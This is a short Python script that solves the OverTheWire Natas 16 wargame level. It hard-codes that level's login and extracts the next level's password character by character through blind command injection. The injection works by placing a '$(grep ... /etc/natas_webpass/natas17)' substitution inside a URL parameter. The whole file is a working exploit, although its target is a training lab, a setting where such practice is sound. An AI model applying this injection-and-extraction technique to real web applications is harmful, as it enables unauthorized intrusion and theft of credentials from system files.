import requests
from requests.auth import HTTPBasicAuth
import multiprocessing  
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  


filteredChars ='bcdghkmnqrswAGHNPQSW035789'
passwd = ''  
for i in range(32):
    for character in filteredChars:
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=Africans$(grep ^' + passwd + character + ' /etc/natas_webpass/natas17)', auth=auth)

        if 'Africans' not in r.text:
            passwd = passwd + character
            print(passwd)
            break